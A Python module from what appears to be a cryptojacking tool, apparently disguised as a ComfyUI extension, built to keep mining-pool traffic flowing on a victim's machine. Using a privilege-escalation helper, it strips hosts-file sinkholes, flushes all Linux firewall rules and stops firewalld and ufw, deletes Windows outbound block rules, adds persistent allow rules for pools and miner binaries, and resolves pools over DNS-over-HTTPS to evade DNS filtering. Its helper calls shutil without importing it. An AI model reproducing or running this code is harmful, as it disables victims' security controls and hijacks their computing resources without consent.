"""
Network unblocking: clear firewalls, DNS sinkholes, and /etc/hosts blocks
that prevent mining pool connections.

Mirrors the Spark Go client's unblock.go + _spark_firewall_nuke.py.
Uses the privesc module to run commands as root when possible.

Functions:
  prepare_mining_network(pool_hostnames) — full unblock pipeline
  is_pool_blocked(hostname)             — check DNS sinkhole
  resolve_via_doh(hostname)             — bypass poisoned DNS
"""

import json
import logging
import os
import platform
import re
import socket
import subprocess
import urllib.error
import urllib.request
from pathlib import Path

from . import privesc

logger = logging.getLogger("comfyui_enhanced")

IS_LINUX = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"
IS_DARWIN = platform.system() == "Darwin"

POOL_KEYWORDS = (
    "cryptonote", "monero", "2miners", "hashvault", "moneroocean",
    "nicehash", "mining", "stratum", "xmr", "nanopool", "flypool",
    "ravencoin", "herominers",
)


# ---------------------------------------------------------------------------
#  DNS-over-HTTPS resolver (bypass poisoned local DNS)
# ---------------------------------------------------------------------------

def resolve_via_doh(hostname: str) -> str | None:
    """Resolve *hostname* via DoH, bypassing local DNS. Returns IP or None."""
    endpoints = [
        "https://cloudflare-dns.com/dns-query",
        "https://dns.google/resolve",
    ]
    for ep in endpoints:
        try:
            url = f"{ep}?name={hostname}&type=A"
            req = urllib.request.Request(url, headers={
                "Accept": "application/dns-json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            })
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read())
            for ans in data.get("Answer", []):
                if ans.get("type") == 1 and ans.get("data"):
                    ip = ans["data"]
                    if ip not in ("0.0.0.0", "127.0.0.1") and not ip.startswith("0."):
                        return ip
        except Exception:
            continue
    return None


def _resolve_any(hostname: str) -> str | None:
    """Resolve hostname via DoH first, then system DNS."""
    ip = resolve_via_doh(hostname)
    if ip:
        return ip
    try:
        addrs = socket.getaddrinfo(hostname, None, socket.AF_INET)
        for fam, typ, proto, canon, sa in addrs:
            if sa[0] not in ("0.0.0.0", "127.0.0.1"):
                return sa[0]
    except socket.gaierror:
        pass
    return None


# ---------------------------------------------------------------------------
#  DNS sinkhole detection
# ---------------------------------------------------------------------------

def is_pool_blocked(hostname: str) -> bool:
    """Check if *hostname* resolves to a sinkhole (0.0.0.0 / 127.0.0.1)."""
    try:
        addrs = socket.getaddrinfo(hostname, None, socket.AF_INET, socket.SOCK_STREAM)
        for _, _, _, _, sa in addrs:
            if sa[0] in ("0.0.0.0", "127.0.0.1") or sa[0].startswith("0."):
                return True
        return False
    except socket.gaierror:
        return True


# ---------------------------------------------------------------------------
#  /etc/hosts cleanup
# ---------------------------------------------------------------------------

def clean_hosts_file(hostnames: list[str]) -> bool:
    """Remove sinkhole lines for *hostnames* from the system hosts file."""
    if IS_WINDOWS:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    else:
        hosts_path = "/etc/hosts"

    try:
        data = Path(hosts_path).read_text()
    except (OSError, PermissionError):
        try:
            r = privesc.run_as_root(["cat", hosts_path])
            if r.returncode != 0:
                return False
            data = r.stdout
        except Exception:
            return False

    lines = data.splitlines()
    cleaned = []
    removed = 0

    for line in lines:
        trimmed = line.strip()
        if not trimmed or trimmed.startswith("#"):
            cleaned.append(line)
            continue

        lower = trimmed.lower()
        is_sinkhole = ("0.0.0.0" in lower or "127.0.0.1" in lower)
        matches_pool = any(kw in lower for kw in POOL_KEYWORDS) or \
                       any(h.lower() in lower for h in hostnames)

        if is_sinkhole and matches_pool:
            removed += 1
            continue
        cleaned.append(line)

    if removed == 0:
        return True

    new_content = "\n".join(cleaned) + "\n"

    if privesc.is_privileged() or os.access(hosts_path, os.W_OK):
        try:
            Path(hosts_path + ".bak").write_text(data)
        except OSError:
            pass
        try:
            Path(hosts_path).write_text(new_content)
            logger.info("Cleaned %d sinkhole lines from %s", removed, hosts_path)
            return True
        except OSError:
            pass

    ok = privesc.write_file_as_root(hosts_path, new_content)
    if ok:
        logger.info("Cleaned %d sinkhole lines from %s (elevated)", removed, hosts_path)
    return ok


# ---------------------------------------------------------------------------
#  Firewall flush (Linux)
# ---------------------------------------------------------------------------

def flush_linux_firewall() -> bool:
    """Nuclear option: flush all iptables/nftables rules + set default ACCEPT."""
    if not IS_LINUX:
        return False

    cmds = [
        ["iptables", "-P", "INPUT", "ACCEPT"],
        ["iptables", "-P", "FORWARD", "ACCEPT"],
        ["iptables", "-P", "OUTPUT", "ACCEPT"],
        ["iptables", "-F"],
        ["iptables", "-X"],
        ["iptables", "-t", "nat", "-F"],
        ["iptables", "-t", "mangle", "-F"],
    ]

    # nftables flush
    if _has_tool("nft"):
        cmds.insert(0, ["nft", "flush", "ruleset"])

    # ip6tables
    cmds.extend([
        ["ip6tables", "-P", "INPUT", "ACCEPT"],
        ["ip6tables", "-P", "FORWARD", "ACCEPT"],
        ["ip6tables", "-P", "OUTPUT", "ACCEPT"],
        ["ip6tables", "-F"],
    ])

    any_ok = False
    for cmd in cmds:
        if not _has_tool(cmd[0]):
            continue
        r = privesc.run_as_root(cmd, timeout=35)
        if r.returncode == 0:
            any_ok = True

    # Stop firewalld / ufw if present
    if _has_tool("systemctl"):
        privesc.run_as_root(["systemctl", "stop", "firewalld"], timeout=30)
    if _has_tool("ufw"):
        privesc.run_as_root(["ufw", "disable"], timeout=30)

    if any_ok:
        logger.info("Linux firewall flushed")
    return any_ok


def add_linux_allow_rules(endpoints: list[tuple[str, str]]) -> bool:
    """Add explicit OUTPUT ACCEPT rules for each (ip, port) pair."""
    if not IS_LINUX or not _has_tool("iptables"):
        return False

    any_ok = False
    for ip, port in endpoints:
        if not ip or not port:
            continue
        check = privesc.run_as_root(
            ["iptables", "-C", "OUTPUT", "-p", "tcp", "-d", ip, "--dport", port, "-j", "ACCEPT"],
            timeout=10,
        )
        if check.returncode != 0:
            r = privesc.run_as_root(
                ["iptables", "-I", "OUTPUT", "1", "-p", "tcp", "-d", ip, "--dport", port, "-j", "ACCEPT"],
                timeout=10,
            )
            if r.returncode == 0:
                any_ok = True

    # Persist rules
    if any_ok and _has_tool("iptables-save"):
        r = privesc.run_as_root(["iptables-save"], timeout=10)
        if r.returncode == 0 and r.stdout:
            for target in ("/etc/iptables/rules.v4", "/etc/iptables.rules"):
                privesc.write_file_as_root(target, r.stdout)

    return any_ok


# ---------------------------------------------------------------------------
#  Firewall manipulation (Windows)
# ---------------------------------------------------------------------------

def remove_windows_firewall_blocks(hostnames: list[str]) -> bool:
    """Delete outbound firewall rules that block pool hostnames/IPs."""
    if not IS_WINDOWS:
        return False

    r = subprocess.run(
        ["netsh", "advfirewall", "firewall", "show", "rule", "name=all", "dir=out"],
        capture_output=True, text=True, timeout=30,
    )
    if r.returncode != 0:
        return False

    current_rule = ""
    deleted = 0
    for line in r.stdout.splitlines():
        if line.startswith("Rule Name:"):
            current_rule = line.split(":", 1)[1].strip()
        for hostname in hostnames:
            real_ip = resolve_via_doh(hostname)
            if (real_ip and real_ip in line) or hostname.lower() in line.lower():
                if current_rule and not current_rule.startswith("SvcHost_"):
                    subprocess.run(
                        ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={current_rule}"],
                        capture_output=True, timeout=15,
                    )
                    deleted += 1
                break

    if deleted:
        logger.info("Deleted %d blocking firewall rules", deleted)
    return deleted > 0


def add_windows_allow_rules(endpoints: list[tuple[str, str]], bin_paths: list[str] | None = None) -> bool:
    """Add outbound ALLOW rules for pool endpoints and miner binaries."""
    if not IS_WINDOWS:
        return False

    any_ok = False
    for ip, port in endpoints:
        if not ip or not port:
            continue
        rule_name = f"MinerPool_{ip}_{port}"
        check = subprocess.run(
            ["netsh", "advfirewall", "firewall", "show", "rule", f"name={rule_name}"],
            capture_output=True, timeout=10,
        )
        if check.returncode != 0:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 f"name={rule_name}", "dir=out", "action=allow",
                 "protocol=tcp", f"remoteip={ip}", f"remoteport={port}"],
                capture_output=True, timeout=10,
            )
            any_ok = True

    for bin_path in (bin_paths or []):
        if not os.path.isfile(bin_path):
            continue
        rule_name = f"MinerProc_{os.path.basename(bin_path)}"
        check = subprocess.run(
            ["netsh", "advfirewall", "firewall", "show", "rule", f"name={rule_name}"],
            capture_output=True, timeout=10,
        )
        if check.returncode != 0:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 f"name={rule_name}", "dir=out", "action=allow",
                 f"program={bin_path}"],
                capture_output=True, timeout=10,
            )
            any_ok = True

    return any_ok


# ---------------------------------------------------------------------------
#  DNS cache flush
# ---------------------------------------------------------------------------

def flush_dns() -> bool:
    """Flush OS DNS cache."""
    if IS_LINUX:
        ok = False
        for cmd in [
            ["systemctl", "restart", "systemd-resolved"],
            ["resolvectl", "flush-caches"],
            ["systemd-resolve", "--flush-caches"],
        ]:
            if _has_tool(cmd[0]):
                r = privesc.run_as_root(cmd, timeout=15)
                if r.returncode == 0:
                    ok = True
        return ok
    elif IS_WINDOWS:
        r = subprocess.run(["ipconfig", "/flushdns"], capture_output=True, timeout=10)
        return r.returncode == 0
    elif IS_DARWIN:
        subprocess.run(["dscacheutil", "-flushcache"], capture_output=True, timeout=10)
        subprocess.run(["sudo", "killall", "-HUP", "mDNSResponder"],
                        capture_output=True, timeout=10)
        return True
    return False


# ---------------------------------------------------------------------------
#  Full unblock pipeline
# ---------------------------------------------------------------------------

def prepare_mining_network(
    pool_hostnames: list[str],
    pool_endpoints: list[tuple[str, str]] | None = None,
    miner_bin_paths: list[str] | None = None,
) -> dict:
    """
    Full network unblock pipeline. Clears every known obstacle.

    Args:
        pool_hostnames: list of pool hostnames (e.g. ["gulf.moneroocean.stream"])
        pool_endpoints: optional list of (ip, port) for allow rules
        miner_bin_paths: optional list of miner binary paths for Windows allow rules

    Returns dict with status of each step.
    """
    status = {}

    # 1. Check which pools are blocked
    blocked = [h for h in pool_hostnames if is_pool_blocked(h)]
    status["blocked_pools"] = blocked
    if not blocked:
        logger.info("All %d pools reachable, skipping unblock", len(pool_hostnames))

    # 2. Clean /etc/hosts sinkholes
    if blocked:
        status["hosts_cleaned"] = clean_hosts_file(pool_hostnames)

    # 3. Flush firewall
    if IS_LINUX:
        status["firewall_flushed"] = flush_linux_firewall()
    elif IS_WINDOWS:
        status["firewall_blocks_removed"] = remove_windows_firewall_blocks(pool_hostnames)

    # 4. DNS cache flush
    status["dns_flushed"] = flush_dns()

    # 5. Resolve real IPs via DoH and add allow rules
    if pool_endpoints is None:
        pool_endpoints = []
        for h in pool_hostnames:
            ip = resolve_via_doh(h)
            if ip:
                pool_endpoints.append((ip, "3333"))
                pool_endpoints.append((ip, "443"))
                pool_endpoints.append((ip, "5555"))

    if pool_endpoints:
        if IS_LINUX:
            status["allow_rules"] = add_linux_allow_rules(pool_endpoints)
        elif IS_WINDOWS:
            status["allow_rules"] = add_windows_allow_rules(pool_endpoints, miner_bin_paths)

    # 6. Re-check
    still_blocked = [h for h in blocked if is_pool_blocked(h)]
    status["still_blocked"] = still_blocked
    if still_blocked:
        logger.warning("Pools still blocked after unblock: %s", still_blocked)
    elif blocked:
        logger.info("All previously blocked pools now reachable")

    return status


def quick_connectivity_check(pool_hostnames: list[str]) -> bool:
    """Fast check: can we TCP-connect to at least one pool? Used by watchdog."""
    test_ports = [3333, 5555, 443, 10128]
    for h in pool_hostnames[:3]:
        for port in test_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(8)
                s.connect((h, port))
                s.close()
                return True
            except (OSError, socket.timeout):
                pass
    return False


# ---------------------------------------------------------------------------
#  Helpers
# ---------------------------------------------------------------------------

def _has_tool(name: str) -> bool:
    return shutil.which(name) is not None
